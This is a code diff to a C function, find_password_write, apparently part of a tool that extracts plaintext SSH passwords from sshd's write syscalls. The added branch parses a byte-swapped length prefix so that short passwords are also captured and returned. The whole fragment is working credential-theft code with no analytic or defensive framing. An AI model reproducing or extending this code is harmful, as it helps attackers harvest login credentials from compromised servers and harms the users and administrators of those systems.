@@ -51,6 +51,35 @@ char *find_password_write(char *memory, unsigned long len) {
   if (!memory_copy)
     goto failed_find_password;
 
+  // Different branch so it isn't compiled if the compile time
+  // configuration option SHORT_SSH_STRINGS isn't set we aren't wasting
+  // time. SHORT_SSH_STRINGS is off by default
+  if (SHORT_SSH_STRINGS && len <= 8 && len > 4) {
+    memset(memory_copy, 0, len);
+    memcpy(memory_copy, memory, len);
+
+    strval = &memory_copy[4];
+    slen = strlen(strval);
+
+    // Bytes to read checksum in the sshd write syscall
+    checksum = ((unsigned int *) memory_copy)[0];
+    checksum = ((checksum >> 24) & 0x000000ff)
+             | ((checksum >> 8)  & 0x0000ff00)
+             | ((checksum << 8)  & 0x00ff0000)
+             | ((checksum << 24) & 0xff000000);
+
+    if (slen == checksum) {
+      retval = (char *) calloc(sizeof(char) * len + 1, 1);
+
+      if (!retval)
+        goto failed_find_password;
+
+      memcpy(retval, strval, slen);
+      free(memory_copy);
+      return retval;
+    }
+  }
+
   if (len > 8) {
     memset(memory_copy, 0, len);
     memcpy(memory_copy, memory, len);
